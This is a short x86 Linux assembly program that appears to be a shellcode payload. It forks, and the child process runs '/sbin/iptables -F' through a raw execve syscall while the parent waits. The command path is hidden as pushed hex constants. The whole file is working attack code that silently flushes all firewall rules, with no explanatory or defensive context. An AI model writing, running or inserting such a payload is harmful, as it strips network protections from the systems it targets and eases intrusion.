global _start

section .text
_start:
  xor eax,eax 
  xor ebx,ebx 
  mov al,0x2 
  int 0x80 
  cmp eax,ebx 
  jnz _wait

  xor eax,eax 
  push eax 
  push word 0x462d
  mov esi,esp 
  push eax 
  push dword 0x73656c62
  push dword 0x61747069
  push dword 0x2f6e6962
  push dword 0x732f2f2f
  mov ebx,esp 
  lea edx,[esp+0x10] 
  push eax 
  push esi 
  push esp 
  mov ecx,esp 
  mov al,0xb 
  int 0x80 

_wait:
  mov ebx,eax 
  xor eax,eax 
  xor ecx,ecx 
  xor edx,edx 
  mov al,0x7 
  int 0x80 
